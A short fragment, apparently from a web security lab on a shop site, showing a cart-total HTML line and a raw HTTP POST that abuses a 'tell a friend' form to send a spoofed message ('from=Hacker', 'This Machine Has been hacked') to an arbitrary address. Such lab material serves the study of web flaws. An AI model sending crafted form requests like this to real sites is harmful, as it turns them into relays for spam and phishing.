...
<p align="right" class="carttotal">[Cart value $0.00]</p></td></tr></table>
...
POST /sendmessage.php HTTP/1.0 Referer: http://flower6a.ifslab.net/tellfriend.php Content-Length: 217 Content-Type: application/x-www-form-urlencoded subject=Message&email=noreply@nowhere.com&starttxt=You+have+been+sent+a+message&endtxt=nothing&from=Hacker&to=myemail@scam.net&message=This+Machine+Has+been+hacked&start 
